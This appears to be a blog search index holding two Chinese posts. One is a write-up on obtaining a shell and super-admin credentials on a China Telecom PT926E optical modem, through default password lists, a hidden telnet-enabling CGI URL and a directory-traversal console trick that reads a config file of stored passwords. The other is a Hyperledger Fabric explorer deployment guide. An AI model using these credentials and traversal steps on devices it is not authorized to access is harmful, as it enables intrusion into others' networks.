<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>PT926E拿shell方法</title>
    <link href="/2022/08/24/PT926E%E6%8B%BFshell%E6%96%B9%E6%B3%95/"/>
    <url>/2022/08/24/PT926E%E6%8B%BFshell%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p><strong>PT926E 免复位/TTL/FTP获取超密及根目录方法</strong></p><p>昨晚打派中间无缘无故给我断网好几次，排查+问电信的师傅得出的问题感觉可能是新装的宽带的网关功率太大过热导致的问题。所以决定把光猫做桥接，只负责转发电信号就ok</p><p><img src="/2022/08/24/PT926E%E6%8B%BFshell%E6%96%B9%E6%B3%95/1.png" alt="1"></p><h4 id="常规思路"><a href="#常规思路" class="headerlink" title="常规思路"></a>常规思路</h4><h5 id="1-主机漏洞"><a href="#1-主机漏洞" class="headerlink" title="1.主机漏洞"></a>1.主机漏洞</h5><p>先百度搜一波型号找找漏洞</p><p><img src="/2022/08/24/PT926E%E6%8B%BFshell%E6%96%B9%E6%B3%95/2.png" alt="2"></p><p>21、23可以试试ftp和telnet</p><p>搜索引擎刚好也有能通过ftp和telnet拿管理员账号密码的</p><p><img src="/2022/08/24/PT926E%E6%8B%BFshell%E6%96%B9%E6%B3%95/3.png" alt="3"></p><p>FTP的账号密码默认为网关背后的账号密码</p><p><img src="/2022/08/24/PT926E%E6%8B%BFshell%E6%96%B9%E6%B3%95/4.png" alt="4"></p><p>FTP 寄 ！试试Telnet(Telnet用不了的控制面板开一下)，Telnet，寄！</p><p><img src="/2022/08/24/PT926E%E6%8B%BFshell%E6%96%B9%E6%B3%95/5.png" alt="5"></p><p>试了好几遍给的通用密码基本都8太行，可以做排列组合试试，太懒试了几个就没继续了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk">网上的字典大概分为这几种<br>useradmin/网关后面给的密码<br>telecomadmin/nE7jA%<span class="hljs-number">5</span>m<br>telecomadmin/TeleCom_1234<br>telecomadmin/TeleCom_SN后六位<br>admin/TeleCom_1234<br>admin/<span class="hljs-number">1234</span><br>telnet假如端口没开启的话可以通过访问：<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/cgi-bin/</span>abcdidfope94e0934jiewru8ew414.cgi<br></code></pre></td></tr></table></figure><h5 id="PS："><a href="#PS：" class="headerlink" title="PS："></a>PS：</h5><p>后面看到另外一篇文章之后又去复现了一遍</p><p>TeleCom_1234/TeleCom_sn后六位能成功登录</p><p>su提权 密码为TeleCom_1234</p><p>之后就能直接获取shell</p><p>然后通过cat /var/config/lastgood.xml 将文件重定向到txt中就(忘记截图了-.-)</p><h5 id="2-web漏洞"><a href="#2-web漏洞" class="headerlink" title="2.web漏洞"></a>2.web漏洞</h5><p>通过U盘查看文件目录，对文件目录通过修改审查元素实现目录穿越</p><p><img src="/2022/08/24/PT926E%E6%8B%BFshell%E6%96%B9%E6%B3%95/6.png" alt="6"></p><p>将文件命都改成..，通过js的点击事件跳转到上一级目录</p><p><img src="/2022/08/24/PT926E%E6%8B%BFshell%E6%96%B9%E6%B3%95/7.png" alt="7"></p><p><strong>结果：寄!</strong></p><p>最后发现有一处能实现目录穿越</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">url:http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.1</span><span class="hljs-regexp">/cgi-bin/</span>luci<span class="hljs-regexp">/admin/</span>storage/settings<br>首先需要先使用普通用户登录进控制台<br>然后F12在console中输入<br>get_path_files(<span class="hljs-string">&quot;/&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/2022/08/24/PT926E%E6%8B%BFshell%E6%96%B9%E6%B3%95/8.png" alt="8"></p><p>之后进/var/config/中拷贝lastgood.xml文件到你的u盘中即可，打开lastgood.xml搜索teleCom即可找到ftp、telnet、superadmin等所有的账号密码</p><p><img src="/2022/08/24/PT926E%E6%8B%BFshell%E6%96%B9%E6%B3%95/9.png" alt="9"></p><p>再访问192.168.1.1:8080/admin/login.asp即可进入管理界面</p><p>中间摆烂好久+参加hw+接了一些渗透的活 就一直没动力更新文章5555</p><p>太菜了</p><p>接下来一个月一定一定<del>(下次一定)</del>肝一篇论文出来</p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><h5 id="路由器方面的知识可以去恩山论坛看看，有很多意想不到的好东西"><a href="#路由器方面的知识可以去恩山论坛看看，有很多意想不到的好东西" class="headerlink" title="路由器方面的知识可以去恩山论坛看看，有很多意想不到的好东西"></a>路由器方面的知识可以去恩山论坛看看，有很多意想不到的好东西</h5><p><a href="https://post.smzdm.com/p/a992pzl0/">https://post.smzdm.com/p/a992pzl0/</a></p><p><a href="https://www.right.com.cn/FORUM/thread-2203236-1-1.html">https://www.right.com.cn/FORUM/thread-2203236-1-1.html</a></p><p><a href="https://www.right.com.cn/FORUM/forum.php?mod=viewthread&amp;tid=6019067">https://www.right.com.cn/FORUM/forum.php?mod=viewthread&amp;tid=6019067</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>电信光猫</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fabric explorer部署</title>
    <link href="/2022/04/14/fabric-explorer%E9%83%A8%E7%BD%B2/"/>
    <url>/2022/04/14/fabric-explorer%E9%83%A8%E7%BD%B2/</url>
    
    <content type="html"><![CDATA[<h2 id="区块链浏览器"><a href="#区块链浏览器" class="headerlink" title="区块链浏览器"></a>区块链浏览器</h2><h3 id="区块链浏览器部署"><a href="#区块链浏览器部署" class="headerlink" title="区块链浏览器部署"></a>区块链浏览器部署</h3><p>首先git clone下来如下配置文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/hyperledger/</span>blockchain-explorer<span class="hljs-regexp">/blob/m</span>ain/docker-compose.yaml<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/hyperledger/</span>blockchain-explorer<span class="hljs-regexp">/blob/m</span>ain<span class="hljs-regexp">/examples/</span>net1<span class="hljs-regexp">/connection-profile/</span>test-network.json<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/hyperledger/</span>blockchain-explorer<span class="hljs-regexp">/blob/m</span>ain<span class="hljs-regexp">/examples/</span>net1/config.json<br></code></pre></td></tr></table></figure><p>然后再对其进行修改，其中使用的docker-compose.yaml是用于pull expolorer的镜像以及其配置文件的</p><p>test-network.json  连接到fabric网络的配置文件</p><p>config.json则是用来指定fabric网络连接配置文件的路径</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">docker-compose.yaml中定义的：<br><span class="hljs-number">1</span>.explorer所使用的后端的存储postgresql以及数据库的账户密码<br><span class="hljs-number">2</span>.explorer项目本身环境变量以及账户密码<br><span class="hljs-number">3</span>.volumns  需要挂载<span class="hljs-built_in">config</span>.<span class="hljs-keyword">json </span>   <br><span class="hljs-number">4</span>.连接的配置信息connection-profile   <br><span class="hljs-number">5</span>.以及区块链网络所使用的身份信息文件<br></code></pre></td></tr></table></figure><h3 id="编写docker-compose-explorer-yaml文件"><a href="#编写docker-compose-explorer-yaml文件" class="headerlink" title="编写docker-compose-explorer.yaml文件"></a>编写docker-compose-explorer.yaml文件</h3><p>参考github种的docker-compose进行编写docker-compose-explorer.yaml文件</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">version</span>: <span class="hljs-string">&#x27;2.1&#x27;</span><br>volume<span class="hljs-variable">s:</span><br>    pgdat<span class="hljs-variable">a:</span><br>    walletstore:<br>service<span class="hljs-variable">s:</span><br>    explorerdb.mynetwork.<span class="hljs-keyword">com</span>:<br>        image: hyperledger/explorer-d<span class="hljs-variable">b:latest</span><br>        container_name: explorerdb.mynetwork.<span class="hljs-keyword">com</span><br>        <span class="hljs-built_in">hostname</span>: explorerdb.mynetwork.<span class="hljs-keyword">com</span><br>        restar<span class="hljs-variable">t:</span> always<br>        port<span class="hljs-variable">s:</span><br>            - <span class="hljs-number">5432</span>:<span class="hljs-number">5432</span><br>        environmen<span class="hljs-variable">t:</span><br>            - DATABASE_DATABASE=fabricexplorer<br>            - DATABASE_USERNAME=hppoc<br>            - DATABASE_PASSWORD=password<br>        healthcheck:<br>            tes<span class="hljs-variable">t:</span> <span class="hljs-string">&quot;pg_isready -h localhost -p 5432 -q -U postgres&quot;</span><br>            interva<span class="hljs-variable">l:</span> <span class="hljs-number">30</span>s<br>            timeou<span class="hljs-variable">t:</span> <span class="hljs-number">10</span>s<br>            retrie<span class="hljs-variable">s:</span> <span class="hljs-number">5</span><br>        volume<span class="hljs-variable">s:</span><br>            - pgdat<span class="hljs-variable">a:</span>/var/lib/postgresql/data<br><br><br>    explorer.mynetwork.<span class="hljs-keyword">com</span>:<br>        image: hyperledger/explorer:latest<br>        container_name: explorer.mynetwork.<span class="hljs-keyword">com</span><br>        <span class="hljs-built_in">hostname</span>: explorer.mynetwork.<span class="hljs-keyword">com</span><br>        restar<span class="hljs-variable">t:</span> always<br>        port<span class="hljs-variable">s:</span><br>            - <span class="hljs-number">9091</span>:<span class="hljs-number">8080</span><br>        extra_host<span class="hljs-variable">s:</span><br>            - <span class="hljs-string">&quot;explorerdb.mynetwork.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;orderer0.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;orderer1.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;orderer2.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;peer0.org1.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;peer1.org1.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;peer0.org2.example.com:192.168.177.128&quot;</span><br>            - <span class="hljs-string">&quot;peer1.org2.example.com:192.168.177.128&quot;</span><br>        environmen<span class="hljs-variable">t:</span><br>            - DATABASE_HOST=explorerdb.mynetwork.<span class="hljs-keyword">com</span><br>            - DATABASE_DATABASE=fabricexplorer<br>            - DATABASE_USERNAME=hppoc<br>            - DATABASE_PASSWD=password<br>            - LOG_LEVEL_APP=<span class="hljs-keyword">debug</span><br>            - LOG_LEVEL_DB=info<br>            - LOG_LEVEL_CONSOLE=<span class="hljs-keyword">debug</span><br>            - LOG_CONSOLE_STDOUT=true<br>            - DISCOVERY_AS_LOCALHOST=false<br>        volume<span class="hljs-variable">s:</span><br>            - ./config.json:/<span class="hljs-keyword">opt</span>/explorer/app/platform/fabric/config.json<br>            - ./connection-<span class="hljs-keyword">profile</span>:/<span class="hljs-keyword">opt</span>/explorer/app/platform/fabric/connection-<span class="hljs-keyword">profile</span><br>            - ../crypto-confi<span class="hljs-variable">g:</span>/tmp/crypto<br>            - walletstore:/<span class="hljs-keyword">opt</span>/explorer/wallet<br>        depends_on:<br>            explorerdb.mynetwork.<span class="hljs-keyword">com</span>:<br>                condition: service_healthy<br></code></pre></td></tr></table></figure><h3 id="编写config-json文件"><a href="#编写config-json文件" class="headerlink" title="编写config.json文件"></a>编写config.json文件</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;network-configs&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;prod-network&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Prod Network&quot;</span>,<br>      <span class="hljs-attr">&quot;profile&quot;</span>: <span class="hljs-string">&quot;./connection-profile/NetworkConfig.json&quot;</span><br>    &#125;<br>  &#125;,<br>  <span class="hljs-attr">&quot;license&quot;</span>: <span class="hljs-string">&quot;Apache-2.0&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="编写fabric网络连接配置文件"><a href="#编写fabric网络连接配置文件" class="headerlink" title="编写fabric网络连接配置文件"></a>编写fabric网络连接配置文件</h3><p>NetworkConfig.json需要根据我们的网络拓扑结构进行编写</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;prod-network&quot;</span>,<br>  <span class="hljs-attr">&quot;version&quot;</span>: <span class="hljs-string">&quot;1.0.0&quot;</span>,<br>  <span class="hljs-attr">&quot;client&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;tlsEnable&quot;</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">&quot;adminCredential&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;id&quot;</span>: <span class="hljs-string">&quot;exploreradmin&quot;</span>,<br>      <span class="hljs-attr">&quot;password&quot;</span>: <span class="hljs-string">&quot;exploreradminpw&quot;</span><br>    &#125;,<br>    <span class="hljs-attr">&quot;enableAuthentication&quot;</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">&quot;organization&quot;</span>: <span class="hljs-string">&quot;Org1&quot;</span>,<br>    <span class="hljs-attr">&quot;connection&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;timeout&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;peer&quot;</span>: &#123;<br>          <span class="hljs-attr">&quot;endorser&quot;</span>: <span class="hljs-string">&quot;300&quot;</span><br>        &#125;,<br>        <span class="hljs-attr">&quot;orderer&quot;</span>: <span class="hljs-string">&quot;300&quot;</span><br>      &#125;<br>    &#125;<br>  &#125;,<br>  <span class="hljs-attr">&quot;channels&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;businesschannel&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;peers&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;peer0.org1.example.com&quot;</span>: &#123;<br>          <span class="hljs-attr">&quot;endorsingPeer&quot;</span>: <span class="hljs-literal">true</span>,<br>          <span class="hljs-attr">&quot;chaincodeQuery&quot;</span>: <span class="hljs-literal">true</span>,<br>          <span class="hljs-attr">&quot;ledgerQuery&quot;</span>: <span class="hljs-literal">true</span>,<br>          <span class="hljs-attr">&quot;eventSource&quot;</span>: <span class="hljs-literal">true</span><br>        &#125;,<br>        <span class="hljs-attr">&quot;peer1.org1.example.com&quot;</span>: &#123;<br>          <span class="hljs-attr">&quot;endorsingPeer&quot;</span>: <span class="hljs-literal">true</span>,<br>          <span class="hljs-attr">&quot;chaincodeQuery&quot;</span>: <span class="hljs-literal">true</span>,<br>          <span class="hljs-attr">&quot;ledgerQuery&quot;</span>: <span class="hljs-literal">true</span>,<br>          <span class="hljs-attr">&quot;eventSource&quot;</span>: <span class="hljs-literal">true</span><br>        &#125;,<br>        <span class="hljs-attr">&quot;peer0.org2.example.com&quot;</span>: &#123;<br>          <span class="hljs-attr">&quot;endorsingPeer&quot;</span>: <span class="hljs-literal">true</span>,<br>          <span class="hljs-attr">&quot;chaincodeQuery&quot;</span>: <span class="hljs-literal">true</span>,<br>          <span class="hljs-attr">&quot;ledgerQuery&quot;</span>: <span class="hljs-literal">true</span>,<br>          <span class="hljs-attr">&quot;eventSource&quot;</span>: <span class="hljs-literal">true</span><br>        &#125;,<br>        <span class="hljs-attr">&quot;peer1.org2.example.com&quot;</span>: &#123;<br>          <span class="hljs-attr">&quot;endorsingPeer&quot;</span>: <span class="hljs-literal">true</span>,<br>          <span class="hljs-attr">&quot;chaincodeQuery&quot;</span>: <span class="hljs-literal">true</span>,<br>          <span class="hljs-attr">&quot;ledgerQuery&quot;</span>: <span class="hljs-literal">true</span>,<br>          <span class="hljs-attr">&quot;eventSource&quot;</span>: <span class="hljs-literal">true</span><br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;,<br>  <span class="hljs-attr">&quot;organizations&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;Org1&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;mspid&quot;</span>: <span class="hljs-string">&quot;Org1MSP&quot;</span>,<br>      <span class="hljs-attr">&quot;peers&quot;</span>: [<br>        <span class="hljs-string">&quot;peer0.org1.example.com&quot;</span>,<br>        <span class="hljs-string">&quot;peer1.org1.example.com&quot;</span><br>      ],<br>      <span class="hljs-attr">&quot;adminPrivateKey&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;/tmp/crypto/peerOrganizations/org1.example.com/users/User1@org1.example.com/msp/keystore/priv_sk&quot;</span><br>      &#125;,<br>      <span class="hljs-attr">&quot;signedCert&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;/tmp/crypto/peerOrganizations/org1.example.com/users/User1@org1.example.com/msp/signcerts/User1@org1.example.com-cert.pem&quot;</span><br>      &#125;<br>    &#125;,<br>    <span class="hljs-attr">&quot;Org2&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;mspid&quot;</span>: <span class="hljs-string">&quot;Org2MSP&quot;</span>,<br>      <span class="hljs-attr">&quot;peers&quot;</span>: [<br>        <span class="hljs-string">&quot;peer0.org2.example.com&quot;</span>,<br>        <span class="hljs-string">&quot;peer1.org2.example.com&quot;</span><br>      ],<br>      <span class="hljs-attr">&quot;adminPrivateKey&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;/tmp/crypto/prod-network/peerOrganizations/org2.example.com/users/Admin@org2.example.com/msp/keystore/priv_sk&quot;</span><br>      &#125;,<br>      <span class="hljs-attr">&quot;signedCert&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;/tmp/crypto/peerOrganizations/org2.example.com/users/User1@org2.example.com/msp/signcerts/User1@org2.example.com-cert.pem&quot;</span><br>      &#125;<br>    &#125;<br>  &#125;,<br>  <span class="hljs-attr">&quot;peers&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;peer0.org1.example.com&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;url&quot;</span>: <span class="hljs-string">&quot;grpcs://peer0.org1.example.com:7051&quot;</span>,<br>      <span class="hljs-attr">&quot;grpcOptions&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;ssl-target-name-override&quot;</span>: <span class="hljs-string">&quot;peer0.org1.example.com&quot;</span>,<br>        <span class="hljs-attr">&quot;hostnameOverride&quot;</span>: <span class="hljs-string">&quot;peer0.org1.example.com&quot;</span>,<br>        <span class="hljs-attr">&quot;request-timeout&quot;</span>: <span class="hljs-number">120001</span><br>      &#125;,<br>      <span class="hljs-attr">&quot;tlsCACerts&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;/tmp/crypto/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt&quot;</span><br>      &#125;<br>    &#125;,<br>    <span class="hljs-attr">&quot;peer1.org1.example.com&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;url&quot;</span>: <span class="hljs-string">&quot;grpcs://peer1.org1.example.com:8051&quot;</span>,<br>      <span class="hljs-attr">&quot;grpcOptions&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;ssl-target-name-override&quot;</span>: <span class="hljs-string">&quot;peer1.org1.example.com&quot;</span>,<br>        <span class="hljs-attr">&quot;hostnameOverride&quot;</span>: <span class="hljs-string">&quot;peer1.org1.example.com&quot;</span>,<br>        <span class="hljs-attr">&quot;request-timeout&quot;</span>: <span class="hljs-number">120001</span><br>      &#125;,<br>      <span class="hljs-attr">&quot;tlsCACerts&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;/tmp/crypto/peerOrganizations/org1.example.com/peers/peer1.org1.example.com/tls/ca.crt&quot;</span><br>      &#125;<br>    &#125;,<br>    <span class="hljs-attr">&quot;peer0.org2.example.com&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;url&quot;</span>: <span class="hljs-string">&quot;grpcs://peer0.org2.example.com:7051&quot;</span>,<br>      <span class="hljs-attr">&quot;grpcOptions&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;ssl-target-name-override&quot;</span>: <span class="hljs-string">&quot;peer0.org2.example.com&quot;</span>,<br>        <span class="hljs-attr">&quot;hostnameOverride&quot;</span>: <span class="hljs-string">&quot;peer0.org2.example.com&quot;</span>,<br>        <span class="hljs-attr">&quot;request-timeout&quot;</span>: <span class="hljs-number">120001</span><br>      &#125;,<br>      <span class="hljs-attr">&quot;tlsCACerts&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;/tmp/crypto/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls/ca.crt&quot;</span><br>      &#125;<br>    &#125;,<br>    <span class="hljs-attr">&quot;peer1.org2.example.com&quot;</span>: &#123;<br>      <span class="hljs-attr">&quot;url&quot;</span>: <span class="hljs-string">&quot;grpcs://peer1.org2.example.com:8051&quot;</span>,<br>      <span class="hljs-attr">&quot;grpcOptions&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;ssl-target-name-override&quot;</span>: <span class="hljs-string">&quot;peer1.org2.example.com&quot;</span>,<br>        <span class="hljs-attr">&quot;hostnameOverride&quot;</span>: <span class="hljs-string">&quot;peer1.org2.example.com&quot;</span>,<br>        <span class="hljs-attr">&quot;request-timeout&quot;</span>: <span class="hljs-number">120001</span><br>      &#125;,<br>      <span class="hljs-attr">&quot;tlsCACerts&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;path&quot;</span>: <span class="hljs-string">&quot;/tmp/crypto/peerOrganizations/org2.example.com/peers/peer1.org2.example.com/tls/ca.crt&quot;</span><br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="启动explorer"><a href="#启动explorer" class="headerlink" title="启动explorer"></a>启动explorer</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">docker-compose -f docker-compose-explorer.yaml up -d<br><span class="hljs-comment">#访问区块链浏览器</span><br>http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">9091</span>/<br>其中登录的账户密码在Networkconfig.json中定义可以自行修改<br></code></pre></td></tr></table></figure><h3 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h3><p><img src="/2022/04/14/fabric-explorer%E9%83%A8%E7%BD%B2/2.png" alt="docker启动报错"></p><p>配置文件无效因为services.explorerdb.mynetwork.com不支持配置选项healthy。这个报错的错误原因在于healthycheck这个选项是docker-compose在2.1中加入的，而git clone下来的配置文件默认是写的2.0，所以需要在docker-compose.yaml的配置文件中将version改为2.1</p><p>2.在进行docker-compose up -d部署之前如果一直有问题可以先使用docker将所需要的images pull下来</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">docker pull hyperledger/explorer-<span class="hljs-built_in">db</span> <br>docker pull hyperledger/explorer<br></code></pre></td></tr></table></figure><p>第二次再重新启动docker在查看日志的时候可能会提示这个报错，这个说明的是上次容器启动已经在postgre数据中添加了bussinesschannel这个数据库了，而此次启动的仍然是同一个channel_name所以产生冲突无法启动。</p><p><img src="/2022/04/14/fabric-explorer%E9%83%A8%E7%BD%B2/1.png" alt="docker错误日志"></p><p>解决办法:</p><p>1.进入容器中删除该数据库</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">docker exec -it explorer-db bash<br>psql -U postgres<br><span class="hljs-comment">#查看数据库列表</span><br>postgres-# \l<br><span class="hljs-comment">#进入fabric数据库中 \c表示选中的数据库 \d表示展示表名</span><br><span class="hljs-attribute">postgres</span>=# \c fabricexplorer<br><span class="hljs-attribute">fabricexplorer</span>=# \d<br><span class="hljs-attribute">fabricexplorer</span>=# select * <span class="hljs-keyword">from</span> channel;<br><span class="hljs-attribute">fabricexplorer</span>=# delete <span class="hljs-keyword">from</span> channel where name = <span class="hljs-string">&#x27;businesschannel&#x27;</span>;<br></code></pre></td></tr></table></figure><p>然后再重新使用docker-compose 命令启动容器，就能发现已经没有报错了。</p><p>2.使用docker-compose关闭容器环境的时候</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">docker<span class="hljs-literal">-compose</span> <span class="hljs-operator">-f</span> docker<span 